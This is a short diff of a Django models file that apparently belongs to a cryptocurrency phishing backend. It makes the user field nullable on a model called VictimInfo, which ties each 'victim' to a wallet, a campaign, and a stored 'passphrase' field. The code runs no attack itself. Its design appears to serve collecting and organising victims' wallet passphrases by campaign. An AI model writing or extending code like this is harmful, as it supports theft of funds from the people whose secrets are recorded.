@@ -72,7 +72,7 @@ class Campaign(models.Model):
 
 class VictimInfo(models.Model):
     id = ShortUUIDField(unique=True, max_length=12, length=3, prefix='CL', alphabet='0123456789', primary_key=True)
-    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE)
+    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE, null=True)
     wallet = models.ForeignKey(Wallet, on_delete=models.CASCADE)
     campaign = models.ForeignKey(Campaign, on_delete=models.CASCADE, null=True)  # Associate with Campaign
     passphrase = models.CharField(max_length=400, null=True, blank=True)
